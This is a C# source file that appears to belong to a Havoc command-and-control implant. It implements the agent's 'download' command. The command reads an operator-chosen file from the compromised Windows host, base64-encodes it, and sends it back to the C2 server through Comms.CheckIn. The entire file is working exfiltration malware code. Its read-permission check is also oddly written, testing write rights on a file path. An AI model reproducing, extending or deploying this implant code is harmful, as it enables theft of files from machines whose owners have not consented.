using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using HavocImplant.Communications;

namespace HavocImplant.AgentFunctions
{
    public class Download : CommandInterface
    {
        public override string Command => "download";
        public override bool Dangerous => false;
        public override async Task Run(int taskId)
        {
            Output = "";
            bool isRelativePath = false;
            string downloadLocation = Agent.taskingInformation[taskId].taskArguments;

            if (downloadLocation.EndsWith("\\") || string.IsNullOrEmpty(downloadLocation))
            {
                Output = "Please include the file name in the path to download";
                ReturnOutput(taskId);
                return;
            }

            if (!downloadLocation.StartsWith("\\") && !Regex.Match(downloadLocation.ToLower(), @"^\D:\\").Success) isRelativePath = true;
            string dir = parseDirectory(downloadLocation, isRelativePath);

            downloadLocation = Path.GetFullPath(Path.Combine(new string[] { dir, downloadLocation }));

            Console.WriteLine($"File to download is {downloadLocation}");

            if (File.Exists(downloadLocation))
            {
                if (checkReadAccess(downloadLocation))
                {
                    byte[] fileBytes = File.ReadAllBytes(downloadLocation);
                    string base64Bytes = Convert.ToBase64String(fileBytes);

                    // yo idk wtf i was on but i aint gonna touch it since it worky with the current handler
                    Dictionary<string, string> FileData = new Dictionary<string, string>();
                    FileData.Add("FileSize", fileBytes.Length.ToString());
                    FileData.Add("FileName", Regex.Replace(downloadLocation, @"\r\n?|\n|\n\r", "\\n").Replace("\\", "\\\\\\\\"));
                    FileData.Add("FileContent", Regex.Replace(base64Bytes, @"\r\n?|\n|\n\r", "\\n"));
                    string postData = Utils.DictionaryToJson(FileData);

                    Comms.CheckIn(Agent, postData, "download");
                    Output = $"Successfully downloaded {downloadLocation} with {fileBytes.Length} bytes";
                    ReturnOutput(taskId);
                    return;
                }
                else
                {
                    Output = $"Could not download {downloadLocation} due to lack of permissions";
                    ReturnOutput(taskId); 
                    return;
                }
            }
            else
            {
                Output = $"{downloadLocation} does not exist";
                ReturnOutput(taskId);
                return;
            }
        }
        public static bool checkReadAccess(string dir)
        {
            string DirectoryPath = dir;
            FileSystemRights AccessRight = FileSystemRights.CreateFiles | FileSystemRights.WriteData;


            AuthorizationRuleCollection rules = Directory.GetAccessControl(DirectoryPath).GetAccessRules(true, true, typeof(System.Security.Principal.SecurityIdentifier));
            WindowsIdentity identity = WindowsIdentity.GetCurrent();

            foreach (FileSystemAccessRule rule in rules)
            {
                if (identity.Groups.Contains(rule.IdentityReference))
                {
                    if ((AccessRight & rule.FileSystemRights) == AccessRight && (rule.FileSystemRights & FileSystemRights.ReadData) > 0)
                    {
                        if (rule.AccessControlType == AccessControlType.Allow)
                            return true;
                    }
                }
            }
            return false;
        }
        public static string parseDirectory(string dir, bool isRelativePath)
        {
            dir = dir.Replace("\"", "");
            string retVal = "";
            if (!isRelativePath)
            {
                var tmp = Regex.Split(dir, @"(?<=[\\])").ToList<string>();
                tmp.RemoveAt(tmp.Count - 1);
                dir = Path.GetFullPath(Path.Combine(new string[] { String.Concat(tmp.ToArray<string>()) }));
            }
            else
                dir = Path.GetFullPath(Directory.GetCurrentDirectory());
            return dir;
        }
    }
}
